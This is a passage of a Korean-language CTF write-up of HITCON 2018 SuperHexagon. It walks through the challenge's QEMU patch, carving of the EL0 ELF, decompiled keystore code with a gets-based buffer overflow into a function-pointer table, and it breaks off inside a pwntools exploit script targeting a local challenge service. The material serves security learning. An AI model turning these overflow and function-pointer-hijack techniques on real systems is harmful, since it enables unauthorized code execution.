---
title: "HITCON CTF 2018 - SuperHexagon"
dateString: June 2024
draft: false
tags: ["HITCON 2018 SuperHexagon","Hypervisor Exploit", "Kernel Exploit", "Secure Monitor Exploit"]
weight: 10
date: 2024-06-25
categories: ["CTF"]
# cover:
    # image: ""
---

오랜만에 한꺼번에 블로그 글을 쓰게 되었다.
이번년도 초에 공부를 목적으로 superhexagon을 풀었다.
글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.

# Overview
```C
diff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/hw/arm/hitcon.c qemu/hw/arm/hitcon.c
--- ../temp/qemu-3.0.0/hw/arm/hitcon.c	1969-12-31 16:00:00.000000000 -0800
+++ qemu/hw/arm/hitcon.c	2018-10-19 10:49:59.412023642 -0700
@@ -0,0 +1,208 @@
+#include "qemu/osdep.h"
+#include "qapi/error.h"
+#include "qemu-common.h"
+#include "cpu.h"
+#include "hw/sysbus.h"
+#include "hw/devices.h"
+#include "hw/boards.h"
+#include "hw/arm/arm.h"
+#include "hw/misc/arm_integrator_debug.h"
+#include "net/net.h"
+#include "exec/address-spaces.h"
+#include "sysemu/sysemu.h"
+#include "qemu/error-report.h"
+#include "hw/char/pl011.h"
+#include "hw/loader.h"
+#include "hw/intc/arm_gic_common.h"
+
+typedef struct MemMapEntry {
+    hwaddr base;
+    hwaddr size;
+} MemMapEntry;
+
+enum {
+    VIRT_FLASH,
+    VIRT_CPUPERIPHS,
+    VIRT_MEM,
+    VIRT_SECURE_MEM,
+    VIRT_UART,
+};
+
+#define RAMLIMIT_GB 3
+#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024)
+static const MemMapEntry memmap[] = {
+    /* Space up to 0x8000000 is reserved for a boot ROM */
+    [VIRT_FLASH] =              {          0, 0x08000000 },
+    [VIRT_CPUPERIPHS] =         { 0x08000000, 0x00020000 },
+    [VIRT_UART] =               { 0x09000000, 0x00001000 },
+    [VIRT_SECURE_MEM] =         { 0x0e000000, 0x01000000 },
+    [VIRT_MEM] =                { 0x40000000, RAMLIMIT_BYTES },
+};
+
+static const char *valid_cpus[] = {
+    ARM_CPU_TYPE_NAME("hitcon"),
+};
+
+static bool cpu_type_valid(const char *cpu)
+{
+    int i;
+    for (i = 0; i < ARRAY_SIZE(valid_cpus); i++) {
+        if (strcmp(cpu, valid_cpus[i]) == 0) {
+            return true;
+        }
+    }
+    return false;
+}
+
+static void create_one_flash(const char *name, hwaddr flashbase,
+                             hwaddr flashsize, const char *file,
+                             MemoryRegion *sysmem)
+{
+    /* Create and map a single flash device. We use the same
+     * parameters as the flash devices on the Versatile Express board.
+     */
+    DriveInfo *dinfo = drive_get_next(IF_PFLASH);
+    DeviceState *dev = qdev_create(NULL, "cfi.pflash01");
+    SysBusDevice *sbd = SYS_BUS_DEVICE(dev);
+    const uint64_t sectorlength = 256 * 1024;
+
+    if (dinfo) {
+        qdev_prop_set_drive(dev, "drive", blk_by_legacy_dinfo(dinfo),
+                            &error_abort);
+    }
+
+    qdev_prop_set_uint32(dev, "num-blocks", flashsize / sectorlength);
+    qdev_prop_set_uint64(dev, "sector-length", sectorlength);
+    qdev_prop_set_uint8(dev, "width", 4);
+    qdev_prop_set_uint8(dev, "device-width", 2);
+    qdev_prop_set_bit(dev, "big-endian", false);
+    qdev_prop_set_uint16(dev, "id0", 0x89);
+    qdev_prop_set_uint16(dev, "id1", 0x18);
+    qdev_prop_set_uint16(dev, "id2", 0x00);
+    qdev_prop_set_uint16(dev, "id3", 0x00);
+    qdev_prop_set_string(dev, "name", name);
+    qdev_init_nofail(dev);
+
+    memory_region_add_subregion(sysmem, flashbase,
+                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), 0));
+
+    if (file) {
+        char *fn;
+        int image_size;
+
+        if (drive_get(IF_PFLASH, 0, 0)) {
+            error_report("The contents of the first flash device may be "
+                         "specified with -bios or with -drive if=pflash... "
+                         "but you cannot use both options at once");
+            exit(1);
+        }
+        fn = qemu_find_file(QEMU_FILE_TYPE_BIOS, file);
+        if (!fn) {
+            error_report("Could not find ROM image '%s'", file);
+            exit(1);
+        }
+        image_size = load_image_mr(fn, sysbus_mmio_get_region(sbd, 0));
+        g_free(fn);
+        if (image_size < 0) {
+            error_report("Could not load ROM image '%s'", file);
+            exit(1);
+        }
+    }
+}
+
+static void create_uart(int uart, MemoryRegion *mem, Chardev *chr)
+{
+    hwaddr base = memmap[uart].base;
+    DeviceState *dev = qdev_create(NULL, "pl011");
+    SysBusDevice *s = SYS_BUS_DEVICE(dev);
+    qdev_prop_set_chr(dev, "chardev", chr);
+    qdev_init_nofail(dev);
+    memory_region_add_subregion(mem, base, sysbus_mmio_get_region(s, 0));
+}
+
+static struct arm_boot_info bootinfo;
+
+static void hitcon_init(MachineState *machine)
+{
+    MemoryRegion *sysmem = get_system_memory();
+    MemoryRegion *secure_sysmem = NULL;
+
+    if (!cpu_type_valid(machine->cpu_type)) {
+        error_report("mach-hitcon: CPU type %s not supported", machine->cpu_type);
+        exit(1);
+    }
+
+    if (machine->ram_size != memmap[VIRT_MEM].size) {
+        error_report("mach-virt: NS RAM must be %dGB", RAMLIMIT_GB);
+        exit(1);
+    }
+
+    if(!bios_name) {
+        error_report("mach-hitcon: BIOS bin does not exist");
+        exit(1);
+    }
+
+    // prepare secure memory
+    secure_sysmem = g_new(MemoryRegion, 1);
+    memory_region_init(secure_sysmem, OBJECT(machine), "secure-memory", UINT64_MAX);
+    memory_region_add_subregion_overlap(secure_sysmem, 0, sysmem, -1);
+
+    // prepare cpu
+    Object *cpuobj = object_new(ARM_CPU_TYPE_NAME("hitcon"));
+    object_property_set_int(cpuobj, (0x9 << 8), "mp-affinity", NULL);
+    object_property_set_bool(cpuobj, true, "has_el3", NULL);
+    object_property_set_bool(cpuobj, true, "has_el2", NULL);
+    object_property_set_bool(cpuobj, false, "pmu", NULL);
+    object_property_find(cpuobj, "reset-cbar", NULL);
+    object_property_set_int(cpuobj, memmap[VIRT_CPUPERIPHS].base, "reset-cbar", &error_abort);
+    object_property_set_link(cpuobj, OBJECT(sysmem), "memory", &error_abort);
+    object_property_set_link(cpuobj, OBJECT(secure_sysmem), "secure-memory", &error_abort);
+    object_property_set_bool(cpuobj, true, "realized", &error_fatal);
+    object_unref(cpuobj);
+
+    // prepare ram / rom
+    MemoryRegion *ram = g_new(MemoryRegion, 1);
+    memory_region_allocate_system_memory(ram, NULL, "mach-hitcon.ram", machine->ram_size);
+    memory_region_add_subregion(sysmem, memmap[VIRT_MEM].base, ram);
+
+    hwaddr flashsize = memmap[VIRT_FLASH].size / 2;
+    hwaddr flashbase = memmap[VIRT_FLASH].base;
+    create_one_flash("hitcon.flash0", flashbase, flashsize, bios_name, secure_sysmem);
+    create_one_flash("hitcon.flash1", flashbase + flashsize, flashsize, NULL, sysmem);
+
+    MemoryRegion *secram = g_new(MemoryRegion, 1);
+    hwaddr base = memmap[VIRT_SECURE_MEM].base;
+    hwaddr size = memmap[VIRT_SECURE_MEM].size;
+    memory_region_init_ram(secram, NULL, "hitcon.secure-ram", size, &error_fatal);
+    memory_region_add_subregion(secure_sysmem, base, secram);
+
+    // GIC & UART
+    create_uart(VIRT_UART, sysmem, serial_hd(0));
+
+
+    // prepare boot info
+    bootinfo.ram_size = machine->ram_size;
+    bootinfo.nb_cpus = 1;
+    bootinfo.board_id = -1;
+    bootinfo.firmware_loaded = true;
+    bootinfo.loader_start = memmap[VIRT_MEM].base;
+    bootinfo.kernel_filename = machine->kernel_filename;
+    bootinfo.kernel_cmdline = machine->kernel_cmdline;
+    bootinfo.initrd_filename = machine->initrd_filename;
+    bootinfo.skip_dtb_autoload = true;
+    arm_load_kernel(ARM_CPU(first_cpu), &bootinfo);
+}
+
+static void hitcon_machine_init(MachineClass *mc)
+{
+    mc->desc = "HITCON CTF Virtual Machine";
+    mc->init = hitcon_init;
+    mc->max_cpus = 1;
+    mc->min_cpus = 1;
+    mc->default_cpus = 1;
+    mc->default_ram_size = RAMLIMIT_BYTES;
+    mc->ignore_memory_transaction_failures = true;
+    mc->default_cpu_type = ARM_CPU_TYPE_NAME("hitcon");
+}
+
+DEFINE_MACHINE("hitcon", hitcon_machine_init)
```
DEFINE_MACHINE으로 hitcon machine을 정의한다.
여기서 메모리 계층이 약간 신기하게 되어있다.
qemu 메모리는 기본적으로 메모리 계층? 처럼 region과 그에 대한 subregion으로 구성된다.
이러한 region들은 각자의 priority를 가지며 낮은 priority 일수록 참조가 우선된다.
```C
+#define RAMLIMIT_GB 3
+#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024)
+static const MemMapEntry memmap[] = {
+    /* Space up to 0x8000000 is reserved for a boot ROM */
+    [VIRT_FLASH] =              {          0, 0x08000000 },
+    [VIRT_CPUPERIPHS] =         { 0x08000000, 0x00020000 },
+    [VIRT_UART] =               { 0x09000000, 0x00001000 },
+    [VIRT_SECURE_MEM] =         { 0x0e000000, 0x01000000 },
+    [VIRT_MEM] =                { 0x40000000, RAMLIMIT_BYTES },
+};
```
위와 같은 물리 메모리 맵을 가지게 된다
```C
diff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/hw/arm/Makefile.objs qemu/hw/arm/Makefile.objs
--- ../temp/qemu-3.0.0/hw/arm/Makefile.objs	2018-08-14 12:10:34.000000000 -0700
+++ qemu/hw/arm/Makefile.objs	2018-09-11 00:59:23.915929581 -0700
@@ -1,4 +1,4 @@
-obj-y += boot.o virt.o sysbus-fdt.o
+obj-y += boot.o virt.o sysbus-fdt.o hitcon.o
 obj-$(CONFIG_ACPI) += virt-acpi-build.o
 obj-$(CONFIG_DIGIC) += digic_boards.o
 obj-$(CONFIG_EXYNOS4) += exynos4_boards.o
diff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/hw/char/pl011.c qemu/hw/char/pl011.c
--- ../temp/qemu-3.0.0/hw/char/pl011.c	2018-08-14 12:10:34.000000000 -0700
+++ qemu/hw/char/pl011.c	2018-10-19 16:34:07.692477202 -0700
@@ -94,6 +94,7 @@
         r = s->rsr;
         break;
     case 6: /* UARTFR */
+        usleep(10);
         r = s->flags;
         break;
     case 8: /* UARTILPR */
diff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/target/arm/cpu64.c qemu/target/arm/cpu64.c
--- ../temp/qemu-3.0.0/target/arm/cpu64.c	2018-08-14 12:10:35.000000000 -0700
+++ qemu/target/arm/cpu64.c	2018-10-19 16:26:20.955912362 -0700
@@ -256,6 +256,127 @@
     }
 }
 
+#define FLAG "/home/super_hexagon/flag/"
+
+static uint64_t hitcon_flag_word_idx_read(CPUARMState *env,
+        const ARMCPRegInfo *ri, int idx)
+{
+    int el = arm_current_el(env);
+    bool is_secure = arm_is_secure(env);
+    assert(el >= 0 && el <= 3);
+    const char *flag_name;
+    if (el == 3) {
+        flag_name = FLAG"6";
+    } else if (el == 2) {
+        flag_name = FLAG"3";
+    } else if (el == 1) {
+        if (is_secure) {
+            flag_name = FLAG"5";
+        } else {
+            flag_name = FLAG"2";
+        }
+    } else {
+        if (is_secure) {
+            flag_name = FLAG"4";
+        } else {
+            flag_name = FLAG"1";
+        }
+    }
+    int fd = open(flag_name, O_RDONLY);
+    assert(fd >= 0);
+    assert(idx >= 0 && idx < 8);
+    uint32_t value[8];
+    memset(value, 0, sizeof(value));
+    read(fd, &value, sizeof(value));
+    close(fd);
+    return value[idx];
+}
+
+static uint64_t hitcon_flag_word_0_read(CPUARMState *env, const ARMCPRegInfo *ri)
+{
+    return hitcon_flag_word_idx_read(env, ri, 0);
+}
+
+static uint64_t hitcon_flag_word_1_read(CPUARMState *env, const ARMCPRegInfo *ri)
+{
+    return hitcon_flag_word_idx_read(env, ri, 1);
+}
+
+static uint64_t hitcon_flag_word_2_read(CPUARMState *env, const ARMCPRegInfo *ri)
+{
+    return hitcon_flag_word_idx_read(env, ri, 2);
+}
+
+static uint64_t hitcon_flag_word_3_read(CPUARMState *env, const ARMCPRegInfo *ri)
+{
+    return hitcon_flag_word_idx_read(env, ri, 3);
+}
+
+static uint64_t hitcon_flag_word_4_read(CPUARMState *env, const ARMCPRegInfo *ri)
+{
+    return hitcon_flag_word_idx_read(env, ri, 4);
+}
+
+static uint64_t hitcon_flag_word_5_read(CPUARMState *env, const ARMCPRegInfo *ri)
+{
+    return hitcon_flag_word_idx_read(env, ri, 5);
+}
+
+static uint64_t hitcon_flag_word_6_read(CPUARMState *env, const ARMCPRegInfo *ri)
+{
+    return hitcon_flag_word_idx_read(env, ri, 6);
+}
+
+static uint64_t hitcon_flag_word_7_read(CPUARMState *env, const ARMCPRegInfo *ri)
+{
+    return hitcon_flag_word_idx_read(env, ri, 7);
+}
+
+static void aarch64_hitcon_initfn(Object *obj)
+{
+    ARMCPU *cpu = ARM_CPU(obj);
+
+    aarch64_a57_initfn(obj);
+
+    ARMCPRegInfo hitcon_flag_reginfo[] = {
+        { .name = "FLAG_WORD_0", .state = ARM_CP_STATE_BOTH,
+          .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 0,
+          .access = PL0_RW,
+          .readfn = hitcon_flag_word_0_read, .writefn = arm_cp_write_ignore },
+        { .name = "FLAG_WORD_1", .state = ARM_CP_STATE_BOTH,
+          .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 1,
+          .access = PL0_RW,
+          .readfn = hitcon_flag_word_1_read, .writefn = arm_cp_write_ignore },
+        { .name = "FLAG_WORD_2", .state = ARM_CP_STATE_BOTH,
+          .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 2,
+          .access = PL0_RW,
+          .readfn = hitcon_flag_word_2_read, .writefn = arm_cp_write_ignore },
+        { .name = "FLAG_WORD_3", .state = ARM_CP_STATE_BOTH,
+          .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 3,
+          .access = PL0_RW,
+          .readfn = hitcon_flag_word_3_read, .writefn = arm_cp_write_ignore },
+        { .name = "FLAG_WORD_4", .state = ARM_CP_STATE_BOTH,
+          .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 4,
+          .access = PL0_RW,
+          .readfn = hitcon_flag_word_4_read, .writefn = arm_cp_write_ignore },
+        { .name = "FLAG_WORD_5", .state = ARM_CP_STATE_BOTH,
+          .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 5,
+          .access = PL0_RW,
+          .readfn = hitcon_flag_word_5_read, .writefn = arm_cp_write_ignore },
+        { .name = "FLAG_WORD_6", .state = ARM_CP_STATE_BOTH,
+          .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 6,
+          .access = PL0_RW,
+          .readfn = hitcon_flag_word_6_read, .writefn = arm_cp_write_ignore },
+        { .name = "FLAG_WORD_7", .state = ARM_CP_STATE_BOTH,
+          .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 7,
+          .access = PL0_RW,
+          .readfn = hitcon_flag_word_7_read, .writefn = arm_cp_write_ignore },
+        REGINFO_SENTINEL
+    };
+
+    define_arm_cp_regs(cpu, hitcon_flag_reginfo);
+}
+
 typedef struct ARMCPUInfo {
     const char *name;
     void (*initfn)(Object *obj);
@@ -266,6 +387,7 @@
     { .name = "cortex-a57",         .initfn = aarch64_a57_initfn },
     { .name = "cortex-a53",         .initfn = aarch64_a53_initfn },
     { .name = "max",                .initfn = aarch64_max_initfn },
+    { .name = "hitcon",             .initfn = aarch64_hitcon_initfn },
     { .name = NULL }
 };
 
diff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/target/arm/op_helper.c qemu/target/arm/op_helper.c
--- ../temp/qemu-3.0.0/target/arm/op_helper.c	2018-08-14 12:10:35.000000000 -0700
+++ qemu/target/arm/op_helper.c	2018-10-19 17:53:05.141725519 -0700
@@ -433,7 +433,7 @@
 
     cs->exception_index = EXCP_HLT;
     cs->halted = 1;
-    cpu_loop_exit(cs);
+    exit(0);
 }
 
 void HELPER(wfe)(CPUARMState *env)
```
시스템 레지스터를 읽어서 Exception level 별로 flag를 읽을 수 있다.
  
```C
=====================
    Super Hexagon
=====================

1.  Flags have to be read from 8 sysregs: s3_3_c15_c12_0 ~ s3_3_c15_c12_7
    For example, in aarch64, you may use:
            mrs x0, s3_3_c15_c12_0
            mrs x1, s3_3_c15_c12_1
                             .
                             .
                             .
            mrs x7, s3_3_c15_c12_7
    For first two stages, EL0 and EL1, `print_flag' functions are included.
    Make good use of them.
    qemu-system-aarch64, based on qemu-3.0.0, is also patched to support this
    feature. See `qemu.patch' for more details.

2.  You may add `-S -s' to qemu-system-aarch64 and debug with gdb-multiarch.
    However, if you want to debug ARM binary, you have to patch QEMU, since it
    always give AArch64 debug information. See `qemu-arm-debug.patch'.
    Besides, latest gdb 8.2 may be less buggy.
```
README에서 어떤식으로 flag를 얻을 수 있는지 나와있다.
편의를 위해 모든 level 별로 flag를 읽는 함수가 정의되어있다.
  
![](attachment/23f1facbdfa91f4017c01619b48b53ce.png)
exploit 순서는 위와 같다.
각 EL 마다 취약점을 찾아서 익스플로잇하는게 주요 컨셉이다.
## Debugging environment
docker compose 파일에서 SYS_PTRACE와 1234 포트를 열어서 리모트 디버깅 환경을 구축했다.
그리고 run.sh에 -s 옵션을 추가로 주도록 수정하면 된다.
```JavaScript
services:
    super_hexagon:
        build: ./
        volumes:
            - ./share:/home/super_hexagon:ro
            - ./xinetd:/etc/xinetd.d/super_hexagon:ro
            - ./tmp:/tmp:ro
        ports:
            - "6666:6666"
            - "1234:1234"
        expose:
            - "6666"
            - "1234"
        cap_add:
            - SYS_PTRACE
```
나중에 부득이하게 secure 물리 메모리도 확인해야해서 로컬에서도 디렉토리 구조를 만들어주고 run.sh를 수정했다.
```Python
#!/bin/sh
/home/super_hexagon/qemu-system-aarch64 -nographic -machine hitcon -cpu hitcon -bios /home/super_hexagon/bios.bin -monitor /dev/null 2>/dev/null -serial null -s -S
```
# EL0, Non-secure application
## Carving an ELF binary
```C
> nc localhost 6666
NOTICE:  UART console initialized
INFO:    MMU: Mapping 0 - 0x2844 (783)
INFO:    MMU: Mapping 0xe000000 - 0xe204000 (40000000000703)
INFO:    MMU: Mapping 0x9000000 - 0x9001000 (40000000000703)
NOTICE:  MMU enabled
NOTICE:  BL1: HIT-BOOT v1.0
INFO:    BL1: RAM 0xe000000 - 0xe204000
INFO:      SCTLR_EL3: 30c5083b
INFO:      SCR_EL3:   00000738
INFO:    Entry point address = 0x40100000
INFO:    SPSR = 0x3c9
VERBOSE: Argument #0 = 0x0
VERBOSE: Argument #1 = 0x0
VERBOSE: Argument #2 = 0x0
VERBOSE: Argument #3 = 0x0
NOTICE:  UART console initialized
[VMM] RO_IPA: 00000000-0000c000
[VMM] RW_IPA: 0000c000-0003c000
[KERNEL] mmu enabled
INFO:      TEE PC: e400000
INFO:      TEE SPSR: 1d3
NOTICE:  TEE OS initialized
[KERNEL] Starting user program ...
=== Trusted Keystore ===
Command:
    0 - Load key
    1 - Save key
cmd>
```
접속을 해보면, 부팅이 되면서 위의 유저 어플리케이션이 나온다.
  
bios.bin에서 리버스 엔지니어링 없이 유저 어플리케이션을 카빙할 수 있을지부터 확인했다.
```C
> binwalk bios.bin
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
143472        0x23070         SHA256 hash constants, little endian
770064        0xBC010         ELF, 64-bit LSB executable, version 1 (SYSV)
792178        0xC1672         Unix path: /lib/libc/aarch64
792711        0xC1887         Unix path: /lib/libc/aarch64
794111        0xC1DFF         Unix path: /lib/libc/aarch64
796256        0xC2660         Unix path: /home/seanwu/hitcon-ctf-2018
```
```C
> file BC010
BC010: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), statically linked, with debug_info, not stripped
```
ELF 바이너리가 그대로 들어있어서 이를 추출해서 분석을 시작했다.
```C
int main(void)
{
  int iVar1;
  
  intro();
  load_trustlet(&TA_BIN,0x750);
  cmdtb[0] = cmd_load;
  cmdtb[1] = cmd_save;
  buf = (char *)mmap((void *)0x0,0x1000,0b00000011,0,0,-1);
  for (iVar1 = 0; iVar1 < 10; iVar1 = iVar1 + 1) {
    run();
  }
  return 0;
}
void load_trustlet(char *base,int size)
{
  int iVar1;
  uint ta_mem_s;
  int result;
  uint uVar2;
  uint tci_mem_s;
  void *__dest;
  char *ta_mem;
  TCI *pTVar3;
  void *tci_mem;
  ulong __len;
  
  __len = (ulong)(size + 0xfff) & 0xfffff000;
  __dest = mmap((void *)0x0,__len,3,0,0,-1);
  iVar1 = tc_register_wsm(__dest,__len);
  if (iVar1 == -1) {
    printf("tc_register_wsm: failed to register world shared memory\n");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  memcpy(__dest,base,(long)size);
  iVar1 = tc_init_trustlet(iVar1,size);
  if (iVar1 == 0) {
    pTVar3 = (TCI *)mmap((void *)0x0,0x1000,3,0,0,-1);
    uVar2 = tc_register_wsm(pTVar3,0x1000);
    if (uVar2 != 0xffffffff) {
      tci_buf = pTVar3;
      tci_handle = uVar2;
      return;
    }
    printf("tc_register_wsm: failed to register world shared memory\n");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  printf("tc_init_trustlet: failed to load trustlet\n");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```
```C
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  tc_register_wsm ()
             undefined         w0:1           <RETURN>
                             tc_register_wsm                                 XREF[3]:     Entry Point (*) , 
                                                                                          load_trustlet:00400174 (c) , 
                                                                                          load_trustlet:004001c8 (c)   
        00401b84 68  00  80  d2    mov        x8,#0x3
        00401b88 08  e0  bf  f2    movk       x8,#0xff00 , LSL #16
        00401b8c 01  00  00  d4    svc        0x0
        00401b90 c0  03  5f  d6    ret

                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  tc_init_trustlet ()
             undefined         w0:1           <RETURN>
                             tc_init_trustlet                                XREF[2]:     Entry Point (*) , 
                                                                                          load_trustlet:0040019c (c)   
        00401b74 a8  00  80  d2    mov        x8,#0x5
        00401b78 08  e0  bf  f2    movk       x8,#0xff00 , LSL #16
        00401b7c 01  00  00  d4    svc        0x0
        00401b80 c0  03  5f  d6    ret
```
tc_ 접두사가 붙은 함수들은 trustzone과 상호작용하기 위한 함수들로 보인다.
안에 내용들을 보면 일반적인 번호가 아닌 syscall들을 호출하는 것을 확인할 수 있다.
TA_Bin은 아마 S_EL0의 코드로 보인다.
secure world와 normal world는 서로 world shared memory를 매핑하여 통신하는데, 이를 매핑하는 함수들이 보인다.
```C
void cmd_load(char *buf,int idx,int len)
{
  int iVar1;
  
  iVar1 = load_key(idx,buf);
  if (iVar1 == 0) {
    printf("[%d] => %s\n",(ulong)(uint)idx,buf);
  }
  return;
}
int load_key(int x,char *buf)
{
  byte bVar1;
  int i;
  uint uVar2;
  int iVar3;
  
  tci_buf->cmd = 2;
  tci_buf->index = x;
  tc_tci_call(tci_handle);
  if (tci_buf->cmd == 0) {
    uVar2 = 0;
    while( true ) {
      if (tci_buf->size <= uVar2) break;
      bVar1 = *(byte *)((long)&tci_buf[1].cmd + (long)(int)uVar2);
      buf[(int)(uVar2 << 1)] = "0123456789abcdef"[(int)(uint)(bVar1 >> 4)];
      buf[(long)(int)(uVar2 << 1) + 1] = "0123456789abcdef"[(int)(bVar1 & 0xf)];
      uVar2 = uVar2 + 1;
    }
    buf[tci_buf->size << 1] = '\0';
    iVar3 = 0;
  }
  else {
    printf("load_key: failed (tci_msg: %s)\n",tci_buf + 1);
    iVar3 = -1;
  }
  return iVar3;
}
void cmd_save(char *buf,int idx,int len)
{
  int iVar1;
  
  iVar1 = save_key(idx,buf,len);
  if (iVar1 == 0) {
    printf("[%d] <= %s\n",(ulong)(uint)idx,buf);
  }
  return;
}
int save_key(int x,char *buf,int len)
{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iter;
  int size;
  TCI *pTVar2;
  
  uVar1 = len / 2;
  tci_buf->cmd = 3;
  tci_buf->index = x;
  pTVar2 = tci_buf;
  tci_buf->size = uVar1;
  for (iter = 0; iter < (int)uVar1; iter = iter + 1) {
    iVar2 = h2i(buf[iter << 1]);
    iVar3 = h2i(buf[(long)(iter << 1) + 1]);
    pTVar2->data[iter] = (char)iVar2 * 16 + (char)iVar3;
  }
  pTVar2->data[(int)uVar1] = '\0';
  tc_tci_call(tci_handle);
  if (tci_buf->cmd == 0) {
    iter = 0;
  }
  else {
    printf("save_key: failed (tci_msg: %s)\n",tci_buf->data);
    iter = -1;
  }
  return iter;
}
```
tci_buf→cmd와 index를 설정하고 tci_handle을 인자로 tc_tci_call을 호출한다.
```C
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  tc_tci_call ()
             undefined         w0:1           <RETURN>
                             tc_tci_call                                     XREF[3]:     Entry Point (*) , 
                                                                                          load_key:00400324 (c) , 
                                                                                          save_key:00400490 (c)   
        00401b94 c8  00  80  d2    mov        x8,#0x6
        00401b98 08  e0  bf  f2    movk       x8,#0xff00 , LSL #16
        00401b9c 01  00  00  d4    svc        0x0
        00401ba0 c0  03  5f  d6    ret
```
tci call도 생소한 번호의 시스템 콜을 호출한다.
```C
void run(void)
{
  size_t sVar1;
  int iVar2;
  int idx;
  int cmd;
  
  printf("cmd> ");
  scanf("%d",&cmd);
  printf("index: ");
  scanf("%d",&idx);
  if (cmd == 1) {
    printf("key: ");
    scanf("%s",buf);
    sVar1 = strlen(buf);
    iVar2 = (int)sVar1;
  }
  else {
    iVar2 = 0;
  }
  (*cmdtb[cmd])(buf,idx,iVar2);
  return;
}
```
취약점 자체는 간단하다.
```C
int scanf(char *__format,...)
{
  int iVar1;
  undefined8 in_x1;
  undefined8 in_x2;
  undefined8 in_x3;
  undefined8 in_x4;
  undefined8 in_x5;
  undefined8 in_x6;
  undefined8 in_x7;
  void *local_100;
  void *pvStack_f8;
  void *local_f0;
  undefined8 uStack_e8;
  __va_list ap;
  undefined auStack_40 [8];
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  undefined8 local_8;
  
  ap.__vr_top = auStack_40;
  ap.__gr_offs = -0x38;
  ap.__vr_offs = -0x80;
  ap.__stack = register0x00000008;
  ap.__gr_top = register0x00000008;
  local_38 = in_x1;
  local_30 = in_x2;
  local_28 = in_x3;
  local_20 = in_x4;
  local_18 = in_x5;
  local_10 = in_x6;
  local_8 = in_x7;
  gets(input);
  local_100 = ap.__stack;
  pvStack_f8 = ap.__gr_top;
  uStack_e8 = CONCAT44(ap.__vr_offs,ap.__gr_offs);
  local_f0 = ap.__vr_top;
  iVar1 = vsscanf(input,__format,&local_100);
  return iVar1;
}
```
scanf 내부의 cmdtb보다 0x100 바이트 앞에 위치한 input에 대한 bof가 발생한다.
그리고 cmdtb에 대한 oob access가 발생한다.
  
```C
----------------------------------------------- Total -----------------------------------------------
[+] PT Entry (Total): 9
[+] PT Entry (merged consecutive pages): 6
-------------------------------------------- Memory map --------------------------------------------
Virtual address start-end              Physical address start-end             Total size   Page size   Count  Flags
0x0000000000400000-0x0000000000403000  0x000000000002c000-0x000000000002f000  0x3000       0x1000      3      [EL0/R-X EL1/R-- ACCESSED GLOBAL]
0x0000000000412000-0x0000000000413000  0x000000000002f000-0x0000000000030000  0x1000       0x1000      1      [EL0/RW- EL1/RW- ACCESSED GLOBAL]
0x00007ffeffffd000-0x00007ffeffffe000  0x0000000000034000-0x0000000000035000  0x1000       0x1000      1      [EL0/RW- EL1/RW- ACCESSED GLOBAL]
0x00007ffeffffe000-0x00007ffefffff000  0x0000000000033000-0x0000000000034000  0x1000       0x1000      1      [EL0/RW- EL1/RW- ACCESSED GLOBAL]
0x00007ffefffff000-0x00007fff00000000  0x0000000000032000-0x0000000000033000  0x1000       0x1000      1      [EL0/RW- EL1/RW- ACCESSED GLOBAL]
0x00007fff7fffe000-0x00007fff80000000  0x0000000000030000-0x0000000000032000  0x2000       0x1000      2      [EL0/RW- EL1/RW- ACCESSED GLOBAL]
-------------------------------------------- $TTBR1_EL1 --------------------------------------------
[+] $TTBR1_EL1: 0x1b000
[+] $TCR_EL1: 0x6080100010
[+] Intermediate Physical Address Size: 32 bits
[+] EL1 Kernel Region: 0xffff000000000000 - 0xffffffffffffffff (48 bits)
[+] EL1 Kernel Page Size: 4KB (per page)
[+] granule_bits: 12
[+] LEVELM1_BIT_RANGE: None
[+] LEVEL0_BIT_RANGE: [39, 48]
[+] LEVEL1_BIT_RANGE: [30, 39]
[+] LEVEL2_BIT_RANGE: [21, 30]
[+] LEVEL3_BIT_RANGE: [12, 21]
[+] OFFSET_BIT_RANGE: [0, 12]
--------------------------------------------- LEVEL -1 ---------------------------------------------
```
ELF 바이너리 자체는 메모리에 그대로 올라가있다.
print_flag 함수가 이미 있어서 flag 얻는것 자체는 간단하다.
![](attachment/37528417332e26dd3ddb4d2f1a74a10b.png)
## Exploit code (flag)
```Python
from pwn import *
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010')

p = remote('localhost',6666)
payload = b'A'*0b101 + b'\x00'
payload += b'A' * (0xf8-len(payload))
payload += p64(e.sym.mprotect)
payload += p64(e.sym.buf) 
payload += p64(e.sym.print_flag) # cmd = 1
payload += p64(0xdeadbeef)*1
